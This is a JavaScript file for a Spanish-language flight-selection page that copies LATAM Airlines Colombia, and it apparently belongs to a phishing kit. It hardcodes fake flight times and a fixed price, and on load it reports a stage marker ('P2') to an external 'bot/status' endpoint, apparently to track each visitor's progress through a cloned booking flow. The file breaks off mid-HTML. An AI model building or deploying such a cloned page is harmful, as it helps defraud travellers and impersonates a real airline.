/**
 * DOM Setup
 * 
 */
setTimeout(() =>{
    document.querySelector('.loader-full').remove();
}, 1500);

fetch(`${API_URL}/api/bot/status`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
    },
    body: JSON.stringify({message: 'P2'})
});


const updateDOM = () =>{
    /**
     * Flight resume
     */
    document.querySelector('#label-travel').innerHTML = `${info.flightInfo.origin.city} > ${info.flightInfo.destination.city}`;
    if(info.flightInfo.flightDates[1] === 0){
        let format = new Date(parseInt(info.flightInfo.flightDates[0]));
        document.querySelector('#label-dates').innerHTML = `${(dayDic[format.getDay() - 1]).toLowerCase()}. ${format.toString().split(' ')[2]} de ${(monthDic[format.getMonth()]).toLowerCase()}`;
    }else if(info.flightInfo.flightDates[1] !== 0){
        let format = new Date(parseInt(info.flightInfo.flightDates[0]));
        let format2 = new Date(parseInt(info.flightInfo.flightDates[1]));
        console.log(format.getDay() - 1);
        document.querySelector('#label-dates').innerHTML = `${(dayDic[format.getDay() - 1]).toLowerCase()}. ${format.toString().split(' ')[2]} de ${(monthDic[format.getMonth()]).toLowerCase()} a ${(dayDic[format2.getDay() - 1]).toLowerCase()}. ${format2.toString().split(' ')[2]} de ${(monthDic[format2.getMonth()]).toLowerCase()}`;
    }

    /**Label passengers */
    document.querySelector('#label-passengers').textContent = info.flightInfo.adults + info.flightInfo.children + info.flightInfo.babies;

    /**Label select flight */
    if(info.flightInfo.travel_type === 2){
        document.querySelector('#label-select-flight').innerHTML = `Elige tu <span class="tc-ocean" style="font-weight: 600;">vuelo de ida</span>`;
    }


    /**
     * Flight list
     */
    UIFlights.listFlights();

}
document.addEventListener('DOMContentLoaded', updateDOM);






/**
 * Flights Handler
 * 
 */
class UIFlights{
    static flightsConfig = [
        [
            {
                takeoff: '4:59 a. m.',
                landing: '6:06 a. m',
                duration: '1 h 7 min'
            },
            {
                takeoff: '9:30 a. m.',
                landing: '10:37 a. m',
                duration: '1 h 7 min'
            },
            {
                takeoff: '10:15 a. m.',
                landing: '11:22 a. m',
                duration: '1 h 7 min'
            },
            {
                takeoff: '12:44 p. m.',
                landing: '01:51 p. m',
                duration: '1 h 7 min'
            },
            {
                takeoff: '3:49 p. m.',
                landing: '4:56 p. m',
                duration: '1 h 7 min'
            },
            {
                takeoff: '4:05 p. m.',
                landing: '5:13 p. m',
                duration: '1 h 7 min'
            },
            {
                takeoff: '8:25 p. m.',
                landing: '9:37 p. m',
                duration: '1 h 7 min'
            },
        ],
        [
            {
                takeoff: '7:24 a. m.',
                landing: '8:29 a. m',
                duration: '1 h 5 min'
            },
            {
                takeoff: '8:30 a. m.',
                landing: '9:35 a. m',
                duration: '1 h 5 min'
            },
            {
                takeoff: '12:00 p. m.',
                landing: '1:05 p. m',
                duration: '1 h 5 min'
            },
            {
                takeoff: '4:24 p. m.',
                landing: '5:29 p. m',
                duration: '1 h 5 min'
            },
            {
                takeoff: '6:49 p. m.',
                landing: '7:54 p. m',
                duration: '1 h 5 min'
            },
            {
                takeoff: '9:25 p. m.',
                landing: '10:30 p. m',
                duration: '1 h 5 min'
            },
            {
                takeoff: '10:01 p. m.',
                landing: '11:06 p. m',
                duration: '1 h 5 min'
            },
        ]
    ];

    static flightsDiv = document.querySelector('#flights-list');

    static flightId = null;

    static listFlights(){
        let i = 0;
        this.flightsDiv.innerHTML = '';
        this.flightsConfig[0].forEach(config =>{

            this.flightsDiv.innerHTML += `
                <div class="card-flight p-3 mb-3">
                    <span class="card-flight-label">Más económico</span>
        
                    <div id="${i}" class="d-flex justify-space-between border-bottom mt-3" onclick="UIFlights.showFlightsDetails(${i})">
                        <div>
                            <p class="m-0 fs-2 tc-ocean">${config.takeoff}</p>
                            <p class="m-0 fs-4">${info.flightInfo.origin.code}</p>
                        </div>
                        <div class="d-flex align-items-end flex-column">
                            <p class=" mt-0 mb-1 fs-6 tc-gray-smoke">Duración</p>
                            <p class="fs-6 mt-0">${config.duration}</p>
                        </div>
                        <div class="d-flex align-items-end flex-column">
                            <p class="m-0 fs-2 tc-ocean">${config.landing}</p>
                            <p class="m-0 fs-4">${info.flightInfo.destination.code}</p>
                        </div>
                    </div>
        
                    <div class="d-flex justify-space-between mt-3">
                        <div class="d-flex align-items-center">
                            <a class="fw-bolder tc-blue" href="">Directo</a>
                        </div>
                        <div class="d-flex align-items-end flex-column">
                            <p class="m-1 fs-6 tc-green">Adulto desde</p>
                            <p class="m-0 fs-4 tc-deep-blue">COP ${PRECIO_BASE.toLocaleString('es-Es')},00</p>
                        </div>
                    </div>
        
                    <p class="tc-gray-smoke fs-6 mb-0">Operado por LATAM Airlines Colombia</p>
                </div>
            `;
            i++;
        });
    }

    static showFlightsDetails(id){
        this.flightId = id; // Update open flight dropdown

        let i = 0;
        this.flightsDiv.innerHTML = '';
        this.flightsConfig[0].forEach(config =>{
            if(i === id){
                this.flightsDiv.innerHTML += `
                    <div class="card-flight mb-3">
                        <span class="card-flight-label">Más económico</span>

                        <div class="border-bottom p-3">
                            <div id="${i}" class="d-flex justify-space-between border-bottom mt-3" onclick="UIFlights.showFlightsDetails(${i})">
                                <div>
                                    <p class="m-0 fs-2 tc-ocean">${config.takeoff}</p>
                                    <p class="m-0 fs-4">${info.flightInfo.origin.code}</p>
                                </div>
                                <div class="d-flex align-items-end flex-column">
                                    <p class=" mt-0 mb-1 fs-6 tc-gray-smoke">Duración</p>
                                    <p class="fs-6 mt-0">${config.duration}</p>
                                </div>
                                <div class="d-flex align-items-end flex-column">
                                    <p class="m-0 fs-2 tc-ocean">${config.landing}</p>
                                    <p class="m-0 fs-4">${info.flightInfo.destination.code}</p>
                                </div>
                            </div>
            
                            <div class="d-flex justify-space-between mt-3">
                                <div class="d-flex align-items-center">
                                    <a class="fw-bolder tc-blue" href="">Directo</a>
                                </div>
                                <div class="d-flex align-items-center justify-content-start flex-row" onclick="UIFlights.listFlights()">
                                    <span class="tc-red fw-bold mr-1">Cerrar</span>
                                    <svg class="tc-red" width="20px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path></svg>
                                </div>
                            </div>
            
                            <p class="tc-gray-smoke fs-6 mb-0">Operado por LATAM Airlines Colombia</p>
                        </div>

                        <div class="bg-gray p-1 d-flex border-bottom justify-space-between align-items-center">
                            <p class="tc-gray-smoke fs-6 mb-0 mt-0">Airbus A320 incluye</p>
                            <div>
                                <svg class="tc-ocean" width="12px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M22.9254 3.28794C22.0322 3.28794 21.2232 3.55557 20.5154 4.08245C19.8076 4.60934 19.3273 5.30347 19.0914 6.16488C19.0071 6.49105 18.9651 6.84231 18.9651 7.21865C18.9651 8.34769 19.3864 9.30108 20.229 10.0538L22.5126 6.85067C22.6221 6.71686 22.7569 6.62487 22.917 6.59141C23.0771 6.5496 23.2288 6.58305 23.3636 6.69177C23.4984 6.80049 23.5828 6.93431 23.6249 7.09321C23.667 7.26047 23.6332 7.40265 23.5237 7.53646L21.2402 10.7396C21.7879 10.9821 22.344 11.0992 22.917 11.0992C24.004 11.0992 24.9309 10.7228 25.6893 9.96178C26.4477 9.20909 26.8352 8.28913 26.8352 7.21028C26.8352 6.13143 26.4561 5.20311 25.6893 4.43369C24.9394 3.67264 24.0124 3.28794 22.9254 3.28794ZM22.9254 12.362C22.0828 12.362 21.2738 12.1697 20.5154 11.7933L16.8416 17.0203C16.7068 17.2127 16.5382 17.3047 16.3528 17.3047C16.3023 17.3047 16.2349 17.2879 16.1675 17.2628C16.1001 17.2377 16.0411 17.2043 15.9821 17.1792C15.8473 17.0705 15.7545 16.9283 15.7124 16.7527C15.6703 16.5771 15.7041 16.4182 15.8136 16.2844L19.4874 11.0992C18.9144 10.589 18.4764 10.0036 18.1646 9.33454C17.8528 8.67385 17.6927 7.96297 17.6927 7.21028V6.88413C17.6927 6.77541 17.7096 6.66668 17.7349 6.55795H5.28909C5.23853 6.55795 5.17939 6.58305 5.12883 6.64159C5.10355 6.66668 5.10355 6.70848 5.12883 6.75866L5.171 6.80049V6.8423L13.7827 18.9104C13.867 18.994 13.9093 19.1111 13.9093 19.27V28.7455L19.378 28.7873C19.5381 28.7873 19.6813 28.8459 19.8077 28.9462C19.9257 29.055 19.9931 29.2055 19.9931 29.3895C19.9931 29.5484 19.9341 29.6906 19.8077 29.816C19.6813 29.9331 19.5465 30 19.378 30H7.83387C7.66534 30 7.52209 29.9415 7.40412 29.816C7.28615 29.6989 7.21876 29.5567 7.21876 29.3895C7.21876 29.1971 7.27772 29.0466 7.40412 28.9211C7.52209 28.7957 7.67377 28.7371 7.83387 28.7371H12.6453V19.4206L4.20205 7.55318C4.00825 7.33573 3.90701 7.10156 3.87331 6.8423C3.84803 6.58304 3.89029 6.34887 3.99983 6.13142C4.10937 5.8638 4.27778 5.65472 4.51372 5.50418C4.74123 5.35365 5.01104 5.27839 5.31439 5.27839H18.0887C18.4679 4.30825 19.1083 3.51376 20.0099 2.91161C20.9116 2.3011 21.889 2 22.9507 2C23.9282 2 24.8129 2.24255 25.605 2.72762C26.397 3.21269 27.0121 3.84829 27.4587 4.63443C27.9053 5.42057 28.1329 6.26524 28.1329 7.18519C28.1329 8.15532 27.8886 9.04184 27.3999 9.83634C26.9112 10.6308 26.2707 11.2497 25.4871 11.6762C24.6613 12.1446 23.8186 12.362 22.9254 12.362Z" fill="currentColor"></path></svg>
                                <svg class="tc-ocean" width="12px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M12.4044 9.95942V22.0406L21.2708 16L12.4044 9.95942ZM13.0659 23.1674C12.8769 23.3051 12.6191 23.3741 12.3184 23.3741C12.0091 23.3741 11.7169 23.2622 11.442 23.0384C11.2186 22.8147 11.1072 22.5221 11.1072 22.1607V9.83002C11.1072 9.52025 11.2186 9.22809 11.442 8.95273C11.6568 8.75482 11.9149 8.64284 12.2156 8.61703C12.5077 8.59121 12.774 8.65983 13.0231 8.82332L22.0099 14.95C22.3708 15.1996 22.5511 15.5437 22.5511 15.9912C22.5511 16.4042 22.3708 16.757 22.0099 17.0323L13.0659 23.1674ZM18.7709 30H2.66996C2.47236 30 2.31766 29.9396 2.18878 29.8105C2.05991 29.6814 2 29.544 2 29.3719V18.7877C2 18.5898 2.05991 18.4349 2.18878 18.3058C2.31766 18.1853 2.47236 18.1167 2.66996 18.1167C2.8332 18.1167 2.97948 18.1767 3.10835 18.3058C3.22864 18.4349 3.28875 18.5898 3.28875 18.7877V28.7093H18.6421L28.7113 25.0867V3.29072H4.66349C4.2425 3.29072 3.90729 3.41974 3.66673 3.66928C3.41757 3.91882 3.28875 4.28002 3.28875 4.75328V13.2118C3.28875 13.4098 3.22864 13.5647 3.10835 13.6938C2.97948 13.8228 2.8418 13.8833 2.66996 13.8833C2.47236 13.8833 2.31766 13.8228 2.18878 13.6938C2.05991 13.5647 2 13.4098 2 13.2118V4.75328C2 3.91861 2.24926 3.25598 2.74757 2.7483C3.24589 2.24922 3.89024 2 4.66349 2H29.3728C29.5361 2 29.6823 2.06 29.8112 2.18907C29.9401 2.31814 30 2.45604 30 2.62813V25.5426C30 25.6802 29.9569 25.8093 29.8796 25.9211C29.7937 26.033 29.6993 26.102 29.5876 26.1278L19.0201 29.9567C18.9943 29.9825 18.9598 30 18.9169 30H18.7709Z" fill="currentColor"></path></svg>
                                <svg class="tc-ocean" width="12px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M19.9681 24.271C19.839 24.271 19.7235 24.2269 19.6216 24.1313C19.5196 24.0357 19.4721 23.9033 19.4721 23.7415V14.1957H18.779C18.6499 14.1957 18.5615 14.2178 18.5208 14.2693C18.4732 14.3208 18.4461 14.4237 18.4189 14.5928L17.7258 18.7921H18.3849C18.5412 18.7921 18.6635 18.8436 18.7654 18.9539C18.8673 19.0642 18.9149 19.1893 18.9149 19.329C18.9149 19.4981 18.8673 19.6305 18.7654 19.7408C18.6703 19.8438 18.5412 19.9026 18.3849 19.9026H17.1008C16.9445 19.9026 16.8154 19.8291 16.7067 19.6894C16.5979 19.5717 16.5639 19.4319 16.6046 19.2628L17.3929 14.4531C17.5016 13.5486 17.9637 13.0999 18.7722 13.0999H19.9545C20.0836 13.0999 20.2059 13.1588 20.3146 13.2765C20.4233 13.3941 20.4777 13.5265 20.4777 13.6662V23.7489C20.4777 23.9107 20.43 24.0431 20.3348 24.1387C20.2465 24.2196 20.1176 24.271 19.9681 24.271ZM13.5811 24.3078C13.452 24.3078 13.3365 24.2563 13.2346 24.146C13.1326 24.0357 13.0851 23.9033 13.0851 23.7342V18.2479C13.0851 17.9832 13.1735 17.8214 13.3502 17.7478L14.6955 16.9977V13.6515C14.6955 13.4824 14.743 13.35 14.845 13.2397C14.9469 13.1294 15.0624 13.0779 15.1915 13.0779C15.3478 13.0779 15.4701 13.1294 15.572 13.2397C15.6739 13.35 15.7215 13.4824 15.7215 13.6515V17.3213C15.7215 17.5346 15.6194 17.7037 15.4224 17.8214L14.1043 18.5715V23.7342C14.1043 23.896 14.0567 24.0357 13.9548 24.146C13.8597 24.249 13.7374 24.3078 13.5811 24.3078ZM13.3162 16.6079C13.1599 16.6079 13.0376 16.5564 12.9356 16.4461C12.8337 16.3358 12.7862 16.2108 12.7862 16.0711V13.6515C12.7862 13.4824 12.8337 13.35 12.9356 13.2397C13.0376 13.1294 13.1599 13.0779 13.3162 13.0779C13.4521 13.0779 13.5608 13.1294 13.6627 13.2397C13.7578 13.35 13.8122 13.4824 13.8122 13.6515V16.0711C13.8122 16.2108 13.7646 16.3358 13.6627 16.4461C13.5676 16.5564 13.4521 16.6079 13.3162 16.6079ZM11.5767 16.6079C11.4205 16.6079 11.2981 16.5564 11.1962 16.4461C11.0943 16.3358 11.0467 16.2108 11.0467 16.0711V13.6515C11.0467 13.4824 11.0943 13.35 11.1962 13.2397C11.2981 13.1294 11.4205 13.0779 11.5767 13.0779C11.7126 13.0779 11.8213 13.1294 11.9233 13.2397C12.0184 13.35 12.0727 13.4824 12.0727 13.6515V16.0711C12.0727 16.2108 12.0252 16.3358 11.9233 16.4461C11.8213 16.5564 11.7058 16.6079 11.5767 16.6079ZM22.5975 30H8.0572C7.90093 30 7.77178 29.9412 7.66306 29.8235C7.55435 29.7058 7.5 29.5587 7.5 29.3969V12.2321C7.5 12.063 7.55435 11.9233 7.66306 11.8056C7.77178 11.6879 7.90772 11.6291 8.0572 11.6291C8.23386 11.6291 8.37646 11.6879 8.48518 11.8056C8.59389 11.9233 8.64824 12.063 8.64824 12.2321V28.7939H22.5975C23.1207 28.7939 23.3858 28.4997 23.3858 27.904V8.74623H8.77746C8.64837 8.74623 8.53285 8.69475 8.43093 8.6065C8.32902 8.5109 8.26785 8.39324 8.24747 8.24615C8.17952 7.91521 8.28822 7.68722 8.57359 7.56955L20.9125 2.04651C21.1095 1.97296 21.2862 1.98768 21.4356 2.08329C21.6123 2.23037 21.7006 2.40686 21.7006 2.62014V5.25297C21.7006 5.42212 21.6462 5.56184 21.5375 5.6795C21.4288 5.79717 21.2862 5.85602 21.1095 5.85602C20.9532 5.85602 20.8241 5.79717 20.7154 5.6795C20.6067 5.56184 20.5523 5.41476 20.5523 5.25297V3.50265L11.6039 7.52543H23.9428C24.0923 7.52543 24.2282 7.58425 24.3369 7.70192C24.4457 7.81959 24.5 7.96669 24.5 8.12848V27.8967C24.5 28.5145 24.3233 29.0219 23.97 29.4117C23.6303 29.8088 23.1682 30 22.5975 30Z" fill="currentColor"></path></svg>
                                <svg class="tc-ocean" width="12px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M13.8855 29.9781C13.7083 29.9781 13.5698 29.9266 13.462 29.8165C13.3464 29.7064 13.2927 29.5742 13.2927 29.4053V23.2537H12.06C11.9368 23.2537 11.8135 23.2097 11.7057 23.129C11.5901 23.0482 11.5285 22.9453 11.4977 22.8279L9.93359 16.9257V10.1353C9.93359 9.61413 10.08 9.18854 10.365 8.8582C10.6501 8.52785 11.043 8.31488 11.536 8.21945V6.04053C11.536 5.90105 11.5978 5.76907 11.7211 5.65162C11.8444 5.53416 11.983 5.47526 12.1371 5.47526H19.8559C20.0331 5.47526 20.1718 5.52681 20.2873 5.63692C20.4029 5.74704 20.457 5.87922 20.457 6.04806V8.19005H21.5046C21.6586 8.19005 21.7898 8.24894 21.8977 8.35171C22.0132 8.46183 22.0669 8.59365 22.0669 8.76249V16.9404C22.0438 17.1093 21.8589 17.8214 21.5046 19.0767C21.1579 20.3321 20.9192 21.1468 20.7959 21.5285V21.602C20.5956 22.1232 20.426 22.4829 20.2719 22.6884C20.1255 22.8866 19.9329 23.0407 19.6941 23.1361C19.4553 23.2316 19.1857 23.2756 18.8929 23.2756H18.6311V29.4276C18.6311 29.5964 18.5695 29.7282 18.4539 29.8383C18.3461 29.9485 18.2153 30 18.0612 30C17.884 30 17.7453 29.9485 17.6298 29.8383C17.5219 29.7282 17.4601 29.5964 17.4601 29.4276V23.2756H16.8286C16.6591 23.2756 16.5127 23.2244 16.3971 23.1143C16.2893 23.0042 16.2275 22.872 16.2275 22.7031C16.2275 22.5637 16.2893 22.4387 16.3971 22.3286C16.5127 22.2258 16.6514 22.1673 16.8286 22.1673H18.8779C19.1013 22.1673 19.2473 22.1233 19.3244 22.0278C19.3937 21.9324 19.5094 21.6679 19.6558 21.2421L19.6941 21.169C19.8174 20.8386 20.0333 20.1046 20.3261 18.9667C20.6188 17.8289 20.8114 17.0948 20.8884 16.7644V9.29837H19.8408C19.6945 9.29837 19.5633 9.24718 19.4477 9.13707C19.3399 9.02695 19.2781 8.90197 19.2781 8.76249V6.58393H12.6762V8.19722H16.6668C16.844 8.19722 16.9827 8.25611 17.0983 8.35888C17.2138 8.469 17.2675 8.60118 17.2675 8.77002C17.2675 8.9095 17.2138 9.03412 17.0983 9.14424C16.9904 9.25435 16.844 9.30589 16.6668 9.30589H11.9291C11.359 9.30589 11.0737 9.59231 11.0737 10.1576V16.7716L12.4915 22.1744H13.9088C14.0629 22.1744 14.1937 22.226 14.3015 22.3361C14.4094 22.4462 14.4712 22.5708 14.4712 22.7103V29.4276C14.4712 29.5964 14.4094 29.7282 14.3015 29.8383C14.2014 29.9264 14.0627 29.9781 13.8855 29.9781Z" fill="currentColor"></path><path d="M17.0749 4.23168C17.1905 4.34179 17.3216 4.39334 17.468 4.39334C17.6452 4.39334 17.7839 4.34179 17.8994 4.23168C18.015 4.12156 18.0687 3.98938 18.0687 3.82054V2.5728C18.0687 2.40395 18.015 2.26443 17.8994 2.16166C17.7839 2.05154 17.6452 2 17.468 2C17.3139 2 17.1828 2.05154 17.0749 2.16166C16.9594 2.27177 16.9056 2.40395 16.9056 2.5728V3.82054C16.9056 3.98938 16.9594 4.12156 17.0749 4.23168Z" fill="currentColor"></path><path d="M14.1322 4.23168C14.2401 4.34179 14.3863 4.39334 14.5558 4.39334C14.7099 4.39334 14.841 4.34179 14.9489 4.23168C15.0567 4.12156 15.1181 3.98938 15.1181 3.82054V2.5728C15.1181 2.40395 15.0644 2.26443 14.9489 2.16166C14.841 2.05154 14.7099 2 14.5558 2C14.3863 2 14.2478 2.05154 14.1322 2.16166C14.0167 2.27177 13.9626 2.40395 13.9626 2.5728V3.82054C13.9626 3.98938 14.0167 4.12156 14.1322 4.23168Z" fill="currentColor"></path><path d="M13.8855 29.9781C13.7083 29.9781 13.5698 29.9266 13.462 29.8165C13.3464 29.7064 13.2927 29.5742 13.2927 29.4053V23.2537H12.06C11.9368 23.2537 11.8135 23.2097 11.7057 23.129C11.5901 23.0482 11.5285 22.9453 11.4977 22.8279L9.93359 16.9257V10.1353C9.93359 9.61413 10.08 9.18854 10.365 8.8582C10.6501 8.52785 11.043 8.31488 11.536 8.21945V6.04053C11.536 5.90105 11.5978 5.76907 11.7211 5.65162C11.8444 5.53416 11.983 5.47526 12.1371 5.47526H19.8559C20.0331 5.47526 20.1718 5.52681 20.2873 5.63692C20.4029 5.74704 20.457 5.87922 20.457 6.04806V8.19005H21.5046C21.6586 8.19005 21.7898 8.24894 21.8977 8.35171C22.0132 8.46183 22.0669 8.59365 22.0669 8.76249V16.9404C22.0438 17.1093 21.8589 17.8214 21.5046 19.0767C21.1579 20.3321 20.9192 21.1468 20.7959 21.5285V21.602C20.5956 22.1232 20.426 22.4829 20.2719 22.6884C20.1255 22.8866 19.9329 23.0407 19.6941 23.1361C19.4553 23.2316 19.1857 23.2756 18.8929 23.2756H18.6311V29.4276C18.6311 29.5964 18.5695 29.7282 18.4539 29.8383C18.3461 29.9485 18.2153 30 18.0612 30C17.884 30 17.7453 29.9485 17.6298 29.8383C17.5219 29.7282 17.4601 29.5964 17.4601 29.4276V23.2756H16.8286C16.6591 23.2756 16.5127 23.2244 16.3971 23.1143C16.2893 23.0042 16.2275 22.872 16.2275 22.7031C16.2275 22.5637 16.2893 22.4387 16.3971 22.3286C16.5127 22.2258 16.6514 22.1673 16.8286 22.1673H18.8779C19.1013 22.1673 19.2473 22.1233 19.3244 22.0278C19.3937 21.9324 19.5094 21.6679 19.6558 21.2421L19.6941 21.169C19.8174 20.8386 20.0333 20.1046 20.3261 18.9667C20.6188 17.8289 20.8114 17.0948 20.8884 16.7644V9.29837H19.8408C19.6945 9.29837 19.5633 9.24718 19.4477 9.13707C19.3399 9.02695 19.2781 8.90197 19.2781 8.76249V6.58393H12.6762V8.19722H16.6668C16.844 8.19722 16.9827 8.25611 17.0983 8.35888C17.2138 8.469 17.2675 8.60118 17.2675 8.77002C17.2675 8.9095 17.2138 9.03412 17.0983 9.14424C16.9904 9.25435 16.844 9.30589 16.6668 9.30589H11.9291C11.359 9.30589 11.0737 9.59231 11.0737 10.1576V16.7716L12.4915 22.1744H13.9088C14.0629 22.1744 14.1937 22.226 14.3015 22.3361C14.4094 22.4462 14.4712 22.5708 14.4712 22.7103V29.4276C14.4712 29.5964 14.4094 29.7282 14.3015 29.8383C14.2014 29.9264 14.0627 29.9781 13.8855 29.9781Z" stroke="currentColor" stroke-width="0.0666667"></path><path d="M17.0749 4.23168C17.1905 4.34179 17.3216 4.39334 17.468 4.39334C17.6452 4.39334 17.7839 4.34179 17.8994 4.23168C18.015 4.12156 18.0687 3.98938 18.0687 3.82054V2.5728C18.0687 2.40395 18.015 2.26443 17.8994 2.16166C17.7839 2.05154 17.6452 2 17.468 2C17.3139 2 17.1828 2.05154 17.0749 2.16166C16.9594 2.27177 16.9056 2.40395 16.9056 2.5728V3.82054C16.9056 3.98938 16.9594 4.12156 17.0749 4.23168Z" stroke="currentColor" stroke-width="0.0666667"></path><path d="M14.1322 4.23168C14.2401 4.34179 14.3863 4.39334 14.5558 4.39334C14.7099 4.39334 14.841 4.34179 14.9489 4.23168C15.0567 4.12156 15.1181 3.98938 15.1181 3.82054V2.5728C15.1181 2.40395 15.0644 2.26443 14.9489 2.16166C14.841 2.05154 14.7099 2 14.5558 2C14.3863 2 14.2478 2.05154 14.1322 2.16166C14.0167 2.27177 13.9626 2.40395 13.9626 2.5728V3.82054C13.9626 3.98938 14.0167 4.12156 14.1322 4.23168Z" stroke="currentColor" stroke-width="0.0666667"></path></svg>
                                <svg class="tc-ocean" width="12px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M8.92867 6.56295L8.91514 6.53249C6.64047 7.54243 4.66776 8.95967 2.99081 10.7759C2.87276 10.8948 2.73435 10.9532 2.58124 10.9532C2.42541 10.9532 2.30307 10.9085 2.20985 10.8145C2.09168 10.6953 2.03333 10.5552 2.03333 10.4004C2.03333 10.2431 2.07771 10.12 2.17793 10.0261L2.178 10.0262L2.17973 10.0243C3.95132 8.08953 6.04728 6.58382 8.45336 5.50714C10.8593 4.43833 13.3817 3.90003 16.0042 3.90003C18.6266 3.90003 21.1405 4.43833 23.5543 5.50718C25.968 6.57601 28.057 8.08167 29.8285 10.0243L29.8285 10.0243L29.8295 10.0253C29.9239 10.1204 29.9667 10.2291 29.9667 10.3613C29.9667 10.4953 29.9304 10.6052 29.8577 10.7006L29.857 10.7015L26.1758 15.891L26.1755 15.8915C26.0814 16.0303 25.9447 16.1034 25.7535 16.1034C25.5847 16.1034 25.4462 16.0448 25.3286 15.9267C24.171 14.5403 22.7803 13.4592 21.1489 12.6836L21.1488 12.6836C19.517 11.9156 17.7988 11.5237 15.9958 11.5237C14.2629 11.5237 12.616 11.8763 11.0462 12.5816L11.0461 12.5817C9.47662 13.2947 8.11665 14.2743 6.96651 15.5439L6.94853 15.5637L6.96404 15.5855L9.92396 19.7512L9.94876 19.7861L9.97651 19.7535C10.7252 18.874 11.6205 18.1892 12.6701 17.6989C13.7197 17.2086 14.8228 16.9594 15.9958 16.9594C17.3156 16.9594 18.5502 17.2708 19.6922 17.8856L19.6923 17.8857C20.842 18.5004 21.7762 19.3482 22.4938 20.4297C22.5661 20.5466 22.5885 20.6867 22.5661 20.8447C22.5442 20.9991 22.4721 21.1238 22.356 21.2199C22.3121 21.2417 22.2555 21.2627 22.1998 21.2697L22.1998 21.2694L22.1959 21.2704C22.1356 21.2856 22.0842 21.2929 22.0413 21.2929C21.9332 21.2929 21.842 21.2722 21.7666 21.2314C21.6913 21.1907 21.6298 21.1291 21.5822 21.0441L21.5823 21.0441L21.5808 21.0418C20.9501 20.1074 20.14 19.369 19.151 18.835L19.1509 18.8349C18.1542 18.301 17.1103 18.0338 16.0042 18.0338C14.8981 18.0338 13.8464 18.3009 12.8574 18.835C11.8687 19.3688 11.0508 20.0991 10.4277 21.0415C10.3091 21.2057 10.1561 21.2929 9.96702 21.2929C9.85889 21.2929 9.76776 21.2722 9.6923 21.2314C9.61706 21.1907 9.55556 21.1291 9.50795 21.0441L9.50812 21.0441L9.50606 21.0412L5.8249 15.8519L5.82555 15.8514L5.82012 15.8465C5.7528 15.7854 5.72206 15.6873 5.72206 15.5506C5.72206 15.4179 5.75861 15.299 5.82556 15.1707C7.0697 13.6908 8.58349 12.5303 10.3527 11.7044C12.123 10.8781 14.0096 10.4572 16.0042 10.4572C17.8518 10.4572 19.6143 10.8235 21.284 11.5563C22.9538 12.2891 24.4148 13.3181 25.6671 14.6513L25.695 14.6809L25.7186 14.6477L28.6785 10.4821L28.6945 10.4596L28.6754 10.4397C27.0216 8.71709 25.0959 7.38603 22.8831 6.43863C20.6781 5.49122 18.3802 5.01349 16.0042 5.01349C13.5427 5.01349 11.1822 5.52246 8.9151 6.53251L8.92867 6.56295ZM8.92867 6.56295C6.65797 7.57113 4.68885 8.98584 3.01489 10.799L8.92867 6.56295ZM14.0518 27.2971L14.0516 27.2969C13.5158 26.7643 13.2554 26.1086 13.2554 25.3354C13.2554 24.586 13.5155 23.9459 14.0516 23.413L14.0519 23.4127C14.5801 22.8723 15.2294 22.6099 15.9958 22.6099C16.7385 22.6099 17.3734 22.8798 17.9021 23.4129C18.4307 23.946 18.6984 24.5863 18.6984 25.3354C18.6984 26.1084 18.4305 26.7642 17.9021 27.2971L17.9019 27.2972C17.3735 27.8378 16.7387 28.1 15.9958 28.1C15.2296 28.1 14.5802 27.8299 14.0518 27.2971ZM15.9958 23.7155C15.5377 23.7155 15.1495 23.8753 14.8332 24.1944C14.5174 24.5129 14.3512 24.8962 14.3512 25.3354C14.3512 25.7969 14.5088 26.1963 14.8332 26.5156C15.1499 26.8428 15.5382 26.9944 15.9958 26.9944C16.4312 26.9944 16.8122 26.8343 17.1282 26.5155C17.4445 26.1966 17.6102 25.7974 17.6102 25.3354C17.6102 24.8964 17.4519 24.5208 17.1282 24.1944C16.8122 23.8756 16.4312 23.7155 15.9958 23.7155Z" fill="currentColor" stroke="currentColor" stroke-width="0.0666667"></path></svg>
                            </div>
                        </div>

                        <div class="bg-gray p-2">
                            <div class="slider">
                                <div class="slides">

                                <div id="basic-seat">
                                    <p class="fw-bolder fs-3 ml-3 mt-4">Basic</p>
                                    <div class="container-seat-options p-3">
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Bolso o mochila pequeña</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Cambio con cargo</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
